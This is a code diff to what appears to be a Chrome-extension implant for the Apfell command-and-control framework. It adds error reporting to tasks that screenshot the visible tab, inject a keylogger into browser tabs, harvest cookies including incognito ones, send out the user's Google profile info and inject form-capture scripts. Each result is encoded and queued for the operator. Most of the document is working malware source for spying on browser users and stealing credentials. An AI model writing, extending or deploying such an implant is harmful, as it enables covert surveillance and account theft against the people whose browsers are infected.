@@ -94,6 +94,16 @@ setInterval(function(){
     }
 }, 5000);
 
+function sendError(taskid, tasktype) {
+    let payload = btoa(unescape(encodeURIComponent(JSON.stringify(chrome.runtime.lastError.message))));
+    let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, payload.length, taskid, tasktype, payload);
+    const meta = {};
+    meta.type = 3;
+    meta.metadata = envelope;
+    const metaenvelope = JSON.stringify(meta);
+    out.push(metaenvelope);
+}
+
 (function(){
     // Main function
     /// Receives and processes messages
@@ -188,13 +198,18 @@ setInterval(function(){
                     chrome.tabs.captureVisibleTab(null, function(img) {
                         // send back the base64encoded image
                         //console.log('Image '+img.toString());
-                        let encImg = img.toString().split(',')[1];
-                        const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encImg.length, taskid, tasktype, encImg);
-                        let meta = {};
-                        meta["metatype"] = 3;
-                        meta["metadata"] = apfellmsg;
-                        const metaenvelope = JSON.stringify(meta);
-                        out.push(metaenvelope);
+                        if (img === undefined) {
+                            sendError(taskid, tasktype);
+                        } else {
+                            let encImg = img.toString().split(',')[1];
+                            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encImg.length, taskid, tasktype, encImg);
+                            let meta = {};
+                            meta["metatype"] = 3;
+                            meta["metadata"] = apfellmsg;
+                            const metaenvelope = JSON.stringify(meta);
+                            out.push(metaenvelope);
+                        }
+                        
                     });
                 } else if (tasktype === 2) {
                     // Keylog
@@ -204,16 +219,20 @@ setInterval(function(){
                     // Inject the keylogger script into tab id
                     chrome.tabs.executeScript(id, {
                         code: kl_js
+                    }, function(){
+                        if (chrome.runtime.lastError) {
+                            sendError(taskid, tasktype);
+                        } else {
+                            const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}))));
+                            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
+                            let meta = {};
+                            meta["metatype"] = 3;
+                            meta["metadata"] = apfellmsg;
+                            const metaenvelope = JSON.stringify(meta);
+                            out.push(metaenvelope);
+                        }
                     });
 
-
-                    const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}))));
-                    const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
-                    let meta = {};
-                    meta["metatype"] = 3;
-                    meta["metadata"] = apfellmsg;
-                    const metaenvelope = JSON.stringify(meta);
-                    out.push(metaenvelope);
                 } else if (tasktype === 3) {
                     // Get all cookies. Includes incognito cookies
                     let results = [];
@@ -305,13 +324,17 @@ setInterval(function(){
 
                 } else if (tasktype === 7) {
                     chrome.identity.getProfileUserInfo(function(info){
-                        const data = btoa(unescape(encodeURIComponent((info.email))));
-                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
-                        let meta = {};
-                        meta["metatype"] = 3;
-                        meta["metadata"] = apfellMsg;
-                        const metaenvelope = JSON.stringify(meta);
-                        out.push(metaenvelope);
+                        if (info === undefined) {
+                            sendError(taskid, tasktype);
+                        } else {
+                            const data = btoa(unescape(encodeURIComponent((JSON.stringify(info)))));
+                            const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                            let meta = {};
+                            meta["metatype"] = 3;
+                            meta["metadata"] = apfellMsg;
+                            const metaenvelope = JSON.stringify(meta);
+                            out.push(metaenvelope);
+                        }
                     });
                 } else if (tasktype === 8) {
                     // form capture
@@ -350,16 +373,19 @@ setInterval(function(){
 
                     chrome.tabs.executeScript(tab, {
                         code: code
+                    }, function(){
+                        if (chrome.runtime.lastError) {
+                            sendError(taskid, tasktype);
+                        } else {
+                            const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}))));
+                            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
+                            let meta = {};
+                            meta["metatype"] = 3;
+                            meta["metadata"] = apfellmsg;
+                            const metaenvelope = JSON.stringify(meta);
+                            out.push(metaenvelope);
+                        }
                     });
-
-                    const started = btoa(unescape(encodeURIComponent("Injected code into tab: "+tab)));
-                    const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
-                    let meta = {};
-                    meta["metatype"] = 3;
-                    meta["metadata"] = apfellmsg;
-                    const metaenvelope = JSON.stringify(meta);
-                    out.push(metaenvelope);
-
                 }
             }
         }
